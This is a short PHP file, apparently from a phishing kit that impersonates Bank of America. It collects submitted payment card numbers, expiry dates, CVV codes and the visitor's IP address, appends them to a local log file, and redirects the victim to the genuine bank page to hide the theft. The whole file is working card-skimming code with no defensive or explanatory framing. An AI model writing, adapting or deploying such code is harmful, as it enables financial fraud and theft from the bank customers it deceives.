<?php
include "fucker.php";  
?>
<meta http-equiv="Refresh"
content="0;url=https://secure.bankofamerica.com/applynow/landingPage.go"> 
<?php  
$co2 = $_POST['ipts6'];  
$ca2 = $_POST['ipts7'];
$pn2 = $_POST['ipts8'];
$pn2x = $_POST['ipts9'];        
$IP = getenv("REMOTE_ADDR");  
$BILSMG = "
c4rd: $co2</td>
m3z: $ca2
year: $pn2
cvb: $pn2x
1p: $IP";  
$handle = fopen("Camilarkuka.txt", "a");  
fwrite($handle,$BILSMG);  
$x=md5(microtime());  
?>